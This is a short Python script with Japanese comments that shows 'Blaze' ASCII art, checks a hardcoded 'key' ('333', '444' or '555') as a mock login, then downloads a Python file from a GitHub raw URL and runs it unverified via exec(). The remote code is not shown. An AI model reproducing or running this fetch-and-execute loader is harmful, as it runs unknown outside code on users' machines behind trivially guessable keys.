# ASCIIアートの表示
print("                                               ____  _               ")
print("                                              | __ )| | __ _ _______ ")
print("                                              |  _ \| |/ _` |_  / _ \\")
print("                                              | |_) | | (_| |/ /  __/")
print("                                              |____/|_|\__,_/___\___| ")
print("\n" * 3)

def load_and_execute_script(url):
    try:
        # URLからスクリプトを取得
        import urllib.request
        import importlib.util

        response = urllib.request.urlopen(url)
        script_code = response.read().decode('utf-8')

        # スクリプトをモジュールとして動的にロード
        module_name = 'dynamic_module'
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)
        exec(script_code, module.__dict__)

        # モジュールの実行
        if 'main' in module.__dict__:
            module.main()

    except Exception as e:
        print("スクリプトのロードや実行中にエラーが発生しました:", e)

# キー入力を求める
key_input = input("キーを入力してください: ")

# ログイン成功の条件判定
if key_input == "333":
    script_url = "https://raw.githubusercontent.com/asfsah/update/main/stoped.py"
    load_and_execute_script(script_url)

elif key_input == "444":
    print("ログインしました。hiさん")
    script_url = "https://raw.githubusercontent.com/asfsah/update/main/a.py"
    load_and_execute_script(script_url)

elif key_input == "555":
    print("ログインしました。hiさん")
    script_url = "https://raw.githubusercontent.com/asfsah/update/main/a.py"
    load_and_execute_script(script_url)

else:
    print("ログイン失敗")
